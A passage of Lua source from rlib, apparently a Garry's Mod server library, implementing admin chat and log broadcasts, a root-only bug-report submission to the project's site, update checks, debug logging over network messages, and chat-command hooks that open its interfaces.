        log( 1, lang( 'pco_set_debug_usr', pl:Name( ), toggle ) )
    end
end

/*
*   rlib :: asay :: broadcast
*
*   in-game chat messages that appear in a similar method to ulx asay
*   players receiving message must have permission to 'rlib_asay'
*
*   @param  : str, ply sender
*   @param  : varg { ... }
*/

function tools:asay( sender, ... )

    /*
    *   require cvar to utilize
    */

    if not cvar:GetBool( 'rlib_asay' ) and not base.con:Is( sender ) then
        log( 3, lang( 'asay_disabled' ) )
        return false
    end

    /*
    *   define 'name' of sender
    */

    local from = ( not isstring( sender ) and base.con:Is( sender ) and cfg.smsg.to_console ) or ( not isstring( sender ) and helper.ok.ply( sender ) and sender:Nick( ) ) or ( isstring( sender ) and sender ) or cfg.cmsg.tag_server

    /*
    *   define colors table
    */

    local sclr = cfg.smsg.clrs
    local args = { ... }
    for k, v in pairs( args ) do
        if not isstring( v ) then continue end
        args[ k ] = v .. ' '
    end

    /*
    *   :   console
    *       send a message to console that message was successfully sent
    *
    *   :   player
    *       send a copy of msg but replace from's username with 'You'
    */

    if base.con:Is( sender ) then
        con( sender, sclr.c2, '[' .. cfg.smsg.to_asay .. ']', sclr.msg, ' sent by ', sclr.c1, cfg.smsg.to_console, sclr.msg, ' » ', sclr.msg, ... )
    elseif not base.con:Is( sender ) and helper.ok.ply( sender ) then
        sender:umsg( sclr.t1, cfg.smsg.to_self, sclr.msg, ' » ', sclr.t4, cfg.smsg.to_admins, sclr.msg, ':\n', sclr.msg, ... )
        log( RLIB_LOG_ASAY, '[ %s ] » %s', from, ... )
    end

    /*
    *   send asay to players with permission
    */

    for v in helper.get.players( ) do
        if v == sender then continue end
        if not access:allow( v, 'rlib_asay' ) then continue end
        v:umsg( sclr.t1, from, sclr.msg, ' » ', sclr.t3, cfg.smsg.to_admins, sclr.msg, '\n', sclr.msg, unpack( args ) )
    end

end
hook.Add( 'asay.broadcast', 'asay.broadcast', function( sender, ... ) tools:asay( sender, ... ) end )

/*
*   rlib :: alogs :: send
*
*   sends a log-like message in chat to all players who have permission to 'rlib_alogs'
*
*   @call   : hook.Run( 'alogs.send', cat, 'str_sender', ... )
*   @call   : hook.Run( 'alogs.send', 2, 'Sender Name', 'Message from', cfg.smsg.clrs.t1, 'alogs' )
*
*   @param  : int cat
*   @param  : str sender
*   @param  : varg { ... }
*/

function tools:alogs( cat, sender, ... )

    /*
    *   category
    */

    local c_type    = isnumber( cat ) and cat or 1
    if isnumber( cat ) then
        c_type      = helper.str:ucfirst( base._def.debug_titles[ cat ] )
    elseif isstring( cat ) then
        c_type      = '[' .. cat .. ']'
    end

    /*
    *   sender
    */

    sender = not isstring( sender ) and helper.ok.ply( sender ) and sender:Nick( ) or isstring( sender ) and sender or cfg.cmsg.tag_server

    /*
    *   format args
    */

    local sclr = cfg.smsg.clrs
    local args = { ... }
    for k, v in pairs( args ) do
        if not isstring( v ) then continue end
        args[ k ] = v .. ' '
    end

    /*
    *   loop players to send
    */

    for v in helper.get.players( ) do
        if not access:allow( v, 'rlib_alogs' ) then continue end
        v:umsg( sclr.t1, sender, sclr.msg, ' » ', sclr.t3, c_type, sclr.msg, ' » ', sclr.t2, cfg.smsg.to_admins, sclr.msg, ':\n', sclr.msg, unpack( args ) )
    end

    /*
    *   file logging
    *
    *   add senders name to front of data
    */

    table.insert( args, 1, '[ ' .. sender .. ' ] ' )

    konsole:log( 'dir_alogs', cat, args )

end
hook.Add( 'alogs.send', 'alogs.send', function( cat, sender, ... ) tools:alogs( cat, sender, ... ) end )

/*
*   cvars :: onchangecb
*
*   executed when a cvar has been modified
*   may not include all cvars; only important ones that require monitoring
*
*   @todo   : automatically add hook for server-side cvars
*/

local function cvar_cb_branch( name, old, new )
    log( 1, lang( 'cvar_changed', name, ts( old ), ts( new ) ) )
end
cvars.AddChangeCallback( 'rlib_branch', cvar_cb_branch )

/*
*   netlib :: report
*
*   after the reporter has submitted, have the server gather some information about their server to 
*   include in the report along with their submitted comment.
*
*   @todo   : convert to rnet module
*/

local function netlib_report( len, pl )
    local reporter_input    = net.ReadString( )
    local authcode          = net.ReadString( )

    if not access:bIsRoot( pl ) then
        net.Start           ( 'rlib.tools.report'           )
        net.WriteBool       ( false                         )
        net.WriteString     ( lang( 'reports_no_access' )   )
        net.Send            ( pl                            )

        return false
    end

    /*
    *   fetch server console log
    */

    local console_log = file.Exists( 'console.log', 'GAME' ) and file.Read( 'console.log', 'GAME' ) or lang( 'none' )

    /*
    *   create report table
    */

    local report_data =
    {
        reporter        = pl:SteamID64( ),
        reporter_msg    = reporter_input or lang( 'none' ),
        rlib_build      = mf.version,
        server_ip       = base.get:ip( ),
        server_port     = ts( base.get:port( ) ),
        server_name     = base.get:host( ),
        server_os       = base.get:os( ),
        server_gm       = base.get:gm( true ),
        avg_ping        = helper.get.avgping( )( ),
        consolelog      = console_log,
        has_ulx         = ulx and true or false,
        authcode        = authcode
    }

    /*
    *   submit report table and get response
    */

    oort_post( 'https://tools.rlib.io/report/index.php', report_data, function( body, size, headers, code )
        local is_success, response = false, nil

        if code ~= 200 then response = code end
        if not size or size == 0 then response = lang( 'response_empty' ) end

        local json_body = body and util.JSONToTable( body ) or nil
        if not json_body then
            response    = lang( 'response_none' )
        end

        if not json_body.success then
            response    = lang( 'response_err' )
        else
            is_success  = true
            response    = json_body.response
        end

        net.Start       ( 'rlib.tools.report'   )
        net.WriteBool   ( is_success            )
        net.WriteString ( response              )
        net.Send        ( pl                    )
    end, function( err )
        net.Start       ( 'rlib.tools.report'   )
        net.WriteBool   ( false                 )
        net.WriteString ( err                   )
        net.Send        ( pl                    )
    end )

end
net.Receive( 'rlib.tools.report', netlib_report )

/*
*   netlib :: udm check
*
*   checks the host server for any updates to rlib
*/

local function netlib_udm_check( len, pl )
    local task_udm = coroutine.create( function( )
        local branch = sf( mf.astra.udm.branch, cvar:GetStr( 'rlib_branch', 'stable' ) )
        base.udm:Check( branch )
    end )
    coroutine.resume( task_udm )
end
net.Receive( 'rlib.udm.check', netlib_udm_check )

/*
*   netlib :: udm check
*
*   checks the host server for any updates to rlib
*/

local function netlib_welcome( len, pl )

    local auth_id               = base.oort:AuthID( )
    auth_id                     = tostring( auth_id )

    local bHasRoot, rootuser    = access:root( )
    local owner                 = bHasRoot and istable( rootuser ) and rootuser.name or 'unclaimed'
    owner                       = tostring( owner )

    net.Start                   ( 'rlib.welcome'    )
    net.WriteString             ( auth_id           )
    net.WriteString             ( owner             )
    net.Send                    ( pl                )
end
net.Receive( 'rlib.welcome', netlib_welcome )

/*
*   advanced logging which allows for any client-side errors to be sent to the server as well.
*
*   @param  : int cat
*   @param  : str msg
*   @param  : varg { ... }
*/

local function log_netmsg( cat, msg, ... )
    cat     = isnumber( cat ) and cat or 1
    msg     = isstring( msg ) and msg or lang( 'msg_invalid' )

    if SERVER then
        msg = msg .. table.concat( { ... } , ', ' )
    end

    if CLIENT then
        net.Start           ( 'rlib.debug.console'  )
        net.WriteInt        ( cat, 4                )
        net.WriteString     ( msg                   )
        net.SendToServer    (                       )
    end

    base:logs_beautify( cat, msg )
end

/*
*   netlib :: rlib.debug.console
*/

local function netlib_debug_console( len, pl )
    local cat   = net.ReadInt( 4 )
    local msg   = net.ReadString( )

    log_netmsg( cat, msg )
end
net.Receive( 'rlib.debug.console', netlib_debug_console )

/*
*   netlib :: rlib.debug.ui
*/

local function netlib_debug_ui( len, pl )
    local cat           = net.ReadInt( 4 )
    local msg           = net.ReadString( )

    net.Start           ( 'rlib.debug.ui'   )
    net.WriteInt        ( cat, 4            )
    net.WriteString     ( msg               )
    net.Broadcast       (                   )
end
net.Receive( 'rlib.debug.ui', netlib_debug_ui )

/*
*   psay :: asay :: toggle
*
*   allows a player with access to asay to post a message in chat that other players with asay access can
*   read and reply back to.
*
*   similar to ulx asay
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_asay_ps_toggle( pl, text )

    text = text:Replace( '!', '/' ):lower( ):Trim( )

    /*
    *   ignore non-matching triggers
    */

    if not text:StartWith( cfg.smsg.binds.asay.trigger ) and not text:StartWith( cfg.smsg.binds.asay.command ) then return end

    /*
    *   require cvar to utilize
    */

    if not cvar:GetBool( 'rlib_asay' ) then
        log( 3, lang( 'asay_disabled' ) )
        return false
    end

    /*
    *   clean msg string
    */

    local cleaner   = ( text:StartWith( cfg.smsg.binds.asay.trigger ) and cfg.smsg.binds.asay.trigger ) or ( text:StartWith( cfg.smsg.binds.asay.command ) and cfg.smsg.binds.asay.command )
    text            = string.gsub( text, cleaner, '' )
    text            = helper.str:clean_ws( text )

    /*
    *   run hook
    */

    hook.Run( 'asay.broadcast', pl, text )

    return ''

end
hook.Add( 'PlayerSay', pid( 'tools.asay.psay.toggle' ), tools_asay_ps_toggle )

/*
*	psay :: konsole :: toggle
*
*	toggles the konsole
*
*	@param  : ply pl
*	@param  : str text
*/

local function tools_konsole_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.konsole.binds.enabled then return end
    if not cfg.konsole.binds.chat[ msg ] then return end

    pl:ConCommand( pid( 'konsole' ) )

    return ''
end
hook.Add( 'PlayerSay', pid( 'psay.konsole' ), tools_konsole_ps_toggle )

/*
*	psay :: report :: toggle
*
*	toggles the report interface
*
*	@param  : ply pl
*	@param  : str text
*/

local function tools_report_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.report.binds.enabled then return end
    if not cfg.report.binds.chat[ msg ] then return end

    pl:ConCommand( pid( 'report' ) )

    return ''
end
hook.Add( 'PlayerSay', pid( 'psay.report' ), tools_report_ps_toggle )

/*
*   psay :: pco :: toggle
*
*   allows a player to toggle pco (player-client-optimization) which adjusts numerous command variables
*   which can result in better fps
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_pco_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.pco.binds.enabled then return end
    if not cfg.pco.binds.chat[ msg ] then return end

    if not cvar:GetBool( 'rlib_pco' ) then
        log( 6, lang( 'pco_disabled_debug' ) )
        return false
    end

    local set = ( comp_args and comp_args[ 2 ] ) or false

    tools.pco:Run( pl, set )

    return ''
end
hook.Add( 'PlayerSay', pid( 'tools.pco.psay.toggle' ), tools_pco_ps_toggle )

/*
*   psay :: lang :: toggle
*
*   allows a pl to change the default language they see on interfaces
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_lang_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.languages.binds.enabled then return end
    if not cfg.languages.binds.chat[ msg ] then return end

    net.Start   ( 'rlib.tools.lang'     )
    net.Send    ( pl                    )

    return ''
end
hook.Add( 'PlayerSay', pid( 'tools.lang.psay.toggle' ), tools_lang_ps_toggle )

/*
*   psay :: dc :: toggle
*
*   allows a pl to execute the disconnect interface
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_dc_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.dc.binds.enabled then return end
    if not cfg.dc.binds.chat[ msg ] then return end

    net.Start   ( 'rlib.tools.dc'       )
    net.Send    ( pl                    )

    return ''
end
hook.Add( 'PlayerSay', pid( 'tools.dc.psay.toggle' ), tools_dc_ps_toggle )

/*
*   psay :: rmain :: toggle
*
*   allows a pl to execute the main rlib interface
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_rmain_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.rmain.binds.enabled then return end
    if not cfg.rmain.binds.chat[ msg ] then return end

    net.Start   ( 'rlib.tools.rmain'    )
    net.Send    ( pl                    )

    return ''
end
hook.Add( 'PlayerSay', pid( 'tools.rmain.psay.toggle' ), tools_rmain_ps_toggle )

/*
*   psay :: rcfg :: toggle
*
*   allows a pl to execute the rcfg interface
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_rcfg_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.rcfg.binds.enabled then return end
    if not cfg.rcfg.binds.chat[ msg ] then return end

    route( pl, false, rlib.manifest.name, lang( 'lib_addons_opening' ) )

    timex.simple( 0.5, function( )
        net.Start   ( 'rlib.tools.rcfg'     )
        net.Send    ( pl                    )
    end )

    return ''
end
hook.Add( 'PlayerSay', pid( 'tools.rcfg.psay.toggle' ), tools_rcfg_ps_toggle )

/*
*   psay :: mviewer :: toggle
*
*   allows a pl to execute the mviewer interface
*
*   @param  : ply pl
*   @param  : str text
*/

local function tools_mviewer_ps_toggle( pl, text )
    local comp_args     = string.Split( text, ' ' )
    local msg           = comp_args[ 1 ]:lower( )

    if not cfg.mviewer.binds.enabled then return end
    if not cfg.mviewer.binds.chat[ msg ] then return end

    net.Start   ( 'rlib.tools.mdlviewer'    )
    net.Send    ( pl                        )

    return ''
end
hook.Add( 'PlayerSay', pid( 'tools.mviewer.psay.toggle' ), tools_mviewer_ps_toggle )